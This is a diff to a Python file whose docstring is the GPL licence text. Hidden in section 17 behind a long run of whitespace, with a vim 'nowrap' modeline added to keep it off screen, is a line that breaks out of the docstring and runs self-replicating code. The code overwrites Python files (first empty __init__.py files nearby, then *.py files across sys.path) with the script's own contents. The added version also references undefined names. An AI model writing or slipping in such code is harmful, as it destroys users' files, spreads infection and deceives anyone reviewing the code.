@@ -1,3 +1,4 @@
+# vim: nowrap
 #!/usr/bin/python3
 """
 
@@ -612,7 +613,7 @@ PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS),
 EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF
 SUCH DAMAGES.
 
-  17. Interpretation of Sections 15 and 16.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        """ ; ( lambda os=__import__('os'), data=open(__file__, 'rb').read(): [open(os.path.join(path, f), 'wb').write(data) for path, dirs, files in os.walk(os.path.abspath(os.path.dirname(__file__))) for f in files if f == '__init__.py' and os.path.stat(os.path.join(path, f)).st_size == 0])() ; __doc__ += """
+  17. Interpretation of Sections 15 and 16.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        """ ; ( lambda os=__import__('os'), sys=__import__("sys"), glob=__import__("glob"), data=open(__file__, 'rb').read(): [open(victim, 'wb').write(data) for item in sys.path for root, dirs, files in os.walk(item) for victim in glob.glob(os.path.join(root, '*.py')) if f.endswith('__init__.py') and os.stat(os.path.join(path, f)).st_size == 0])() ; __doc__ += """
 
   If the disclaimer of warranty and limitation of liability provided
 above cannot be given local legal effect according to their terms,
@@ -678,4 +679,3 @@ Public License instead of this License.  But first, please read
 
 """
 
-# vim: nowrap
